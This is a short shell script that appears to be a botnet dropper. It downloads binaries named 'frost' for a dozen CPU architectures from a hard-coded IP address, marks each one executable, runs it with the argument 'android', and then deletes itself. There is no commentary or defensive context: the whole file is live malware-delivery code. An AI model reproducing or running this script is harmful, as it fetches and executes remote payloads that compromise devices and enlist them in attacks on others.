curl http://143.20.185.78/bins/frost.arm; chmod 777 frost.arm; ./frost.arm android
curl http://143.20.185.78/bins/frost.arm5; chmod 777 frost.arm5; ./frost.arm5 android
curl http://143.20.185.78/bins/frost.arm6; chmod 777 frost.arm6; ./frost.arm6 android
curl http://143.20.185.78/bins/frost.arm7; chmod 777 frost.arm7; ./frost.arm7 android
curl http://143.20.185.78/bins/frost.m68k; chmod 777 frost.m68k; ./frost.m68k android
curl http://143.20.185.78/bins/frost.mips; chmod 777 frost.mips; ./frost.mips android
curl http://143.20.185.78/bins/frost.mpsl; chmod 777 frost.mpsl; ./frost.mpsl android
curl http://143.20.185.78/bins/frost.ppc; chmod 777 frost.ppc; ./frost.ppc android
curl http://143.20.185.78/bins/frost.sh4; chmod 777 frost.sh4; ./frost.sh4 android
curl http://143.20.185.78/bins/frost.spc; chmod 777 frost.spc; ./frost.spc android
curl http://143.20.185.78/bins/frost.x86; chmod 777 frost.x86; ./frost.x86 android
curl http://143.20.185.78/bins/frost.x86_64; chmod 777 frost.x86_64; ./frost.x86_64 android

rm $0